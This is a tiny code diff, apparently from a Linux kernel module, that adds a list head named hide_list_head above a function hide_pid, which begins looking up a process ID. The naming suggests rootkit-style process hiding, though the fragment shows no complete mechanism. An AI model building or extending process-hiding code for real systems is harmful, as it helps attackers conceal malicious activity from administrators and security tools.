@@ -1,5 +1,7 @@
 #include "process.h"
 
+struct list_head hide_list_head=LIST_HEAD_INIT(hide_list_head);
+
 int hide_pid(pid_t a){
   struct pid *pid=find_vpid(a);
   if(IS_ERR(pid)){
